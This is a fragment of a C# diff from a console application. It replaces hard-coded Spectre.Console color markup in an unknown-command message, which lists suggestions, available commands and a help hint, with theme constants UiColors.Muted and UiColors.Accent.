-            AnsiConsole.MarkupLine("[dim]Did you mean:[/]");
+            AnsiConsole.MarkupLine($"[{UiColors.Muted}]Did you mean:[/]");
             foreach (var s in suggestions)
-                AnsiConsole.MarkupLine($"  [cyan1]{s}[/]");
+                AnsiConsole.MarkupLine($"  [{UiColors.Accent}]{s}[/]");
             AnsiConsole.WriteLine();
         }
 
-        AnsiConsole.MarkupLine("[dim]Available commands:[/]");
+        AnsiConsole.MarkupLine($"[{UiColors.Muted}]Available commands:[/]");
         foreach (var c in validCommands.Where(c => c != "help"))
-            AnsiConsole.MarkupLine($"  [cyan1]{c}[/]");
+            AnsiConsole.MarkupLine($"  [{UiColors.Accent}]{c}[/]");
 
         AnsiConsole.WriteLine();
-        AnsiConsole.MarkupLine("[dim]Run[/] [cyan1]help[/] [dim]for usage information.[/]");
+        AnsiConsole.MarkupLine($"[{UiColors.Muted}]Run[/] [{UiColors.Accent}]help[/] [{UiColors.Muted}]for usage information.[/]");
         return 1;
     }
 
